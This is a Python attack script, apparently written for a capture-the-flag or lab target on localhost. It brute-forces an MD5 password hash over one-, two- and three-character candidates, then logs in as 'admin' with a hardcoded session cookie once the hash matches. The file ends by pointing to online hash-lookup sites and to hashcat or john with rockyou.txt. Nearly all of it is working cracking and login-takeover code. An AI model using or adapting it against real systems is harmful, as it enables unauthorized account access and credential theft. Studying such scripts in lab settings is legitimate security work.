import requests
import hashlib
import itertools
import string

url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}
cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}

target_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Brute force attack on short passwords")
print("="*60)

# Try all single characters
print("\n[*] Testing all single characters...")
charset = string.ascii_letters + string.digits + string.punctuation
for char in charset:
    hash_val = hashlib.md5(char.encode()).hexdigest()
    if hash_val == target_hash:
        print(f"[!] PASSWORD FOUND: {char}")
        break

# Try all 2-character combinations of common chars
print("\n[*] Testing 2-character combinations (lowercase + digits)...")
charset_small = string.ascii_lowercase + string.digits
count = 0
for combo in itertools.product(charset_small, repeat=2):
    pwd = ''.join(combo)
    hash_val = hashlib.md5(pwd.encode()).hexdigest()
    count += 1
    
    if hash_val == target_hash:
        print(f"\n[!] PASSWORD FOUND: {pwd}")
        print(f"[!] Hash: {hash_val}")
        
        # Try login
        data = {
            "username": "admin",
            "password": pwd,
            "submit": "submit"
        }
        
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"[*] Login response: {response.text}")
        break
    
    if count % 500 == 0:
        print(f"[*] Tested {count} combinations...")
else:
    print(f"[-] Not found in 2-char lowercase+digits ({len(charset_small)**2} combinations)")

# Try 3-character combinations with smaller charset
print("\n[*] Testing 3-character combinations (lowercase only, first 10000)...")
charset_small = string.ascii_lowercase
count = 0
for combo in itertools.product(charset_small, repeat=3):
    pwd = ''.join(combo)
    hash_val = hashlib.md5(pwd.encode()).hexdigest()
    count += 1
    
    if hash_val == target_hash:
        print(f"\n[!] PASSWORD FOUND: {pwd}")
        print(f"[!] Hash: {hash_val}")
        
        # Try login
        data = {
            "username": "admin",
            "password": pwd,
            "submit": "submit"
        }
        
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"[*] Login response: {response.text}")
        break
    
    if count % 2000 == 0:
        print(f"[*] Tested {count} combinations...")
    
    if count >= 10000:  # Limit to first 10k
        print(f"[-] Not found in first {count} 3-char combinations")
        break

print("\n[*] Trying online MD5 hash database lookup hint")
print("="*60)
print(f"[*] Hash to crack: {target_hash}")
print("[*] This hash should be looked up in online databases like:")
print("    - crackstation.net")
print("    - md5decrypt.net")
print("    - hashes.com")
print("[*] Or cracked with hashcat/john using rockyou.txt")

print("\n[*] Script complete")

